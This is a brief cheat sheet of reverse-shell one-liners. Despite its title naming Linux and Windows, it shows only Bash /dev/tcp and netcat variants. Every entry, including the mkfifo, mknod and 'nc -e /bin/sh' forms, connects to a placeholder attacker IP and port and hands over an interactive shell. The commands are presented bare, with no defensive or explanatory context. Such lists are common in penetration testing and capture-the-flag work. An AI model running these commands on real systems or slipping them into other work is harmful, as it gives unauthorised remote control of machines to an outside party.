# **A list of reverse shells for Linux and Windows**

## Bash reverse shells

exec 100<>/dev/tcp/**IP**/**Port** 
cat <&100 | while read line; do $line 2>&100 >&100; done 
Or:
while read line 0<&100; do $line 2>&100 >&100; done

A bash reverse shell one-liner:
bash -i >& /dev/tcp/**IP**/**Port** 0>&1 

## Netcat reverse shell
Without GAPING_SECURITY_HOLE (using mkfifo):

rm -f /tmp/a; mkfifo /tmp/a; nc **IP Port** 0</tmp/a | /bin/sh >/tmp/a 2>&1; rm /tmp/a 

Or using mknod:

rm -f /tmp/a; mknod /tmp/a p && nc **IP Port** 0</tmp/a | /bin/bash 1>/tmp/a 

With GAPING_SECURITY_HOLE:

nc **IP Port** -e /bin/sh 
